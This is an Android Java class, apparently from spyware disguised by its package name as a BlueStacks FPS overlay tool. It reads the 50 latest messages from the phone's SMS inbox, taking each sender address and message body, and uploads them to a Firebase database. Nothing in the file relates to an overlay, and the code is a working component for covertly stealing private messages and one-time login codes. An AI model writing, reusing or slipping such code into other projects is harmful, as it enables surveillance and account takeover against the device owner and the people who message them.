package com.bluestacks.fpsoverlay;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.google.firebase.database.DatabaseReference;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsManager {
    private final Context context;
    private final DatabaseReference dataRef;

    public SmsManager(Context context, DatabaseReference dataRef) {
        this.context = context;
        this.dataRef = dataRef;
    }

    public void sendSmsList() {
        Cursor c = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
        List<Map<String, String>> list = new ArrayList<>();
        if (c != null) {
            while (c.moveToNext()) {
                Map<String, String> m = new HashMap<>();
                m.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                m.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                list.add(m);
            }
            c.close();
        }
        dataRef.child("sms").setValue(list);
    }
}
